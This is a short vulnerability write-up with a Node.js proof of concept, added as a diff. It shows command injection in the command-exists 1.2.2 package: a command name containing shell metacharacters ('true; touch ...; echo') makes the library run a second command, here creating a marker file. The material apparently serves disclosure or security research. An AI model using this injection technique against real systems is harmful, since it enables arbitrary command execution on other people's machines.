@@ -1,0 +1,27 @@
+Confirmed: `command-exists@1.2.2` builds a shell string by concatenating the user-supplied command name directly into `exec`/`execSync` (`command -v ` + cmd + ...), with no sanitization — classic command injection.
+
+```javascript
+const commandExists = require("command-exists");
+const fs = require("fs");
+const os = require("os");
+const path = require("path");
+
+// command-exists concatenates the input directly into a shell string:
+//   execSync('command -v ' + cmd + ' 2>/dev/null && { echo >&1 \'' + cmd + ' found\'; exit 0; }')
+// Supplying shell metacharacters lets us run arbitrary commands.
+const marker = path.join(os.tmpdir(), "pwned_by_command_exists.txt");
+const payload = `true; touch ${marker}; echo`;
+
+try {
+  commandExists.sync(payload);
+} catch (e) {
+  // exec/execSync may throw depending on shell exit code, injection still runs
+}
+
+if (fs.existsSync(marker)) {
+  console.log("[+] Command injection succeeded! Arbitrary file created at:", marker);
+  fs.unlinkSync(marker);
+} else {
+  console.log("[-] Injection did not trigger (check platform/shell).");
+}
+```
